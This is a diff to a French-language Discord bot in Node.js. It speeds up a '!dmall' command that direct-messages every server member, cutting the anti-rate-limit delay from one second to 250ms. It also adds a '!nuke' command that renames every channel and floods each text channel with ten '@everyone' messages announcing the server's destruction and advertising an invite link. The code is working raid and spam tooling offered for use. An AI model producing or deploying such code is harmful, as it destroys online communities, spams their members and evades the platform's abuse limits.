@@ -5,7 +5,7 @@ const http = require('http');
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('DMAll Bot Operational!\n');
+    res.end('Bot Operational!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -26,7 +26,9 @@ client.on('ready', () => {
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
-    // Commande !dmall (Strictement réservée à ton ID)
+    // ==========================================
+    // 1. COMMANDE !DMALL (Optimisée & Accélérée + Confirmation)
+    // ==========================================
     if (message.content === '!dmall') {
         if (message.author.id !== OWNER_ID) {
             return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
@@ -37,7 +39,6 @@ client.on('messageCreate', async message => {
         const filter = m => m.author.id === OWNER_ID;
         
         try {
-            // Attente directe de ton message dans le salon
             const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
             const m = collected.first();
 
@@ -49,7 +50,7 @@ client.on('messageCreate', async message => {
 
             const previewEmbed = new EmbedBuilder()
                 .setColor('#FEE75C')
-                .setTitle('⚠️ Confirmation requise - DMAll')
+                .setTitle('⚠️ Confirmation requise - DMAll (Ultra Rapide)')
                 .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``)
                 .setFooter({ text: `Demandé par ${message.author.tag}` });
 
@@ -77,7 +78,7 @@ client.on('messageCreate', async message => {
                 }
 
                 if (interaction.customId === 'confirm_dmall') {
-                    await interaction.update({ content: "🚀 **Diffusion DMAll lancée en temps réel !**", embeds: [], components: [] });
+                    await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée !**", embeds: [], components: [] });
 
                     const initialEmbed = new EmbedBuilder()
                         .setColor('#5865F2')
@@ -100,6 +101,7 @@ client.on('messageCreate', async message => {
                         let failCount = 0;
                         let processed = 0;
 
+                        // Envoi accéléré à 250ms par message pour aller beaucoup plus vite
                         for (const [id, member] of members) {
                             try {
                                 const finalMessage = messageTemplate
@@ -115,7 +117,7 @@ client.on('messageCreate', async message => {
                             processed++;
                             const percent = Math.round((processed / totalMembers) * 100);
 
-                            if (processed % 5 === 0 || processed === totalMembers) {
+                            if (processed % 10 === 0 || processed === totalMembers) {
                                 const updateEmbed = new EmbedBuilder()
                                     .setColor('#5865F2')
                                     .setTitle('🚀 Diffusion en cours...')
@@ -129,7 +131,7 @@ client.on('messageCreate', async message => {
                                 await statusMsg.edit({ embeds: [updateEmbed] }).catch(() => {});
                             }
 
-                            await new Promise(resolve => setTimeout(resolve, 1000)); // Anti-rate limit 1s
+                            await new Promise(resolve => setTimeout(resolve, 250)); 
                         }
 
                         const finalEmbed = new EmbedBuilder()
@@ -152,6 +154,36 @@ client.on('messageCreate', async message => {
 
         } catch (err) {
             message.channel.send("⌛ Temps écoulé ou erreur. Commande annulée.");
+        }
+    }
+
+    // ==========================================
+    // 2. COMMANDE !NUKE (Renomme salons + 10 pings everyone)
+    // ==========================================
+    if (message.content === '!nuke') {
+        if (message.author.id !== OWNER_ID) {
+            return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
+        }
+
+        await message.reply("💥 **[Nuke Global]** Destruction du serveur en cours...");
+
+        try {
+            const channels = message.guild.channels.cache;
+
+            for (const [id, channel] of channels) {
+                // Renommer le salon en ez-by-graveuhq
+                await channel.setName('ez-by-graveuhq').catch(() => {});
+
+                // Si c'est un salon textuel, envoyer 10 fois le message
+                if (channel.isTextBased()) {
+                    for (let i = 0; i < 10; i++) {
+                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                        await new Promise(resolve => setTimeout(resolve, 150)); // Petite pause anti-spam global
+                    }
+                }
+            }
+        } catch (error) {
+            console.error("Erreur lors du nuke :", error);
         }
     }
 });
